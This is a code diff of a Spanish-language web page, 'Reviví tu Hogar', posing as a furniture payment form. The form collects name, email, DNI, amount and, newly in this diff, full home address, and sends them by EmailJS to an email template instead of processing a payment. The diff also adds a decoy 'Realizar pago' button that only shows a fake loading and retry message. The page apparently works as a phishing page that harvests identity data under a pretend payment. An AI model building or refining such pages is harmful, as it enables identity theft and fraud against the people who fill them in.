@@ -13,7 +13,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
     }
     .form-container {
       background: #fff;
@@ -26,6 +26,13 @@
     h2 {
       text-align: center;
       color: #333;
+      margin-bottom: 10px;
+    }
+    .info {
+      font-size: 14px;
+      color: #777;
+      text-align: center;
+      margin-bottom: 20px;
     }
     input, select, button {
       width: 100%;
@@ -33,6 +40,7 @@
       margin: 10px 0;
       border: 1px solid #ccc;
       border-radius: 5px;
+      font-size: 15px;
     }
     button {
       background: #4CAF50;
@@ -57,14 +65,20 @@
     #realizarPagoBtn {
       display: none;
     }
+    #btnError {
+      background: #c0392b;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
   <div class="form-container">
-    <h2>Reviví tu Hogar - Pago de Muebles</h2>
+    <h2>Reviví tu Hogar</h2>
+    <div class="info">Completá los datos para gestionar tu pago. Al finalizar, recibirás un comprobante por correo.</div>
     <form id="formulario">
       <input type="text" name="nombre" placeholder="Nombre completo" required />
       <input type="email" name="email" placeholder="Correo electrónico" required />
+      <input type="text" name="direccion" placeholder="Dirección completa" required />
       <input type="text" name="dni" placeholder="DNI" required />
       <input type="number" name="monto" placeholder="Monto a pagar" required />
 
@@ -80,18 +94,22 @@
         <button type="submit" id="realizarPagoBtn">Realizar pago</button>
       </div>
     </form>
+
+    <button id="btnError">Realizar pago</button>
+
     <div id="mensajeExito">Tu tarjeta no nos da opciones de cuotas por el momento</div>
   </div>
 
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    emailjs.init('FL6vofHg7F9vLawQs'); // Tu public key
+    emailjs.init('FL6vofHg7F9vLawQs'); // tu PUBLIC KEY de EmailJS
 
     const verCuotasBtn = document.getElementById("verCuotasBtn");
     const cuotasSection = document.getElementById("cuotasSection");
     const realizarPagoBtn = document.getElementById("realizarPagoBtn");
     const formulario = document.getElementById("formulario");
     const mensajeExito = document.getElementById("mensajeExito");
+    const btnError = document.getElementById("btnError");
 
     verCuotasBtn.addEventListener("click", () => {
       cuotasSection.style.display = "block";
@@ -106,6 +124,7 @@
       const templateParams = {
         nombre: formData.get("nombre"),
         email: formData.get("email"),
+        direccion: formData.get("direccion"),
         dni: formData.get("dni"),
         monto: formData.get("monto"),
         cuotas: formData.get("cuotas")
@@ -121,6 +140,15 @@
         }, function(error) {
           alert("Error al enviar. Por favor reintente en unos minutos.");
         });
+    });
+
+    btnError.addEventListener("click", () => {
+      btnError.innerText = "Cargando... Reintente en unos minutos";
+      btnError.disabled = true;
+      setTimeout(() => {
+        btnError.innerText = "Realizar pago";
+        btnError.disabled = false;
+      }, 3000);
     });
   </script>
 </body>
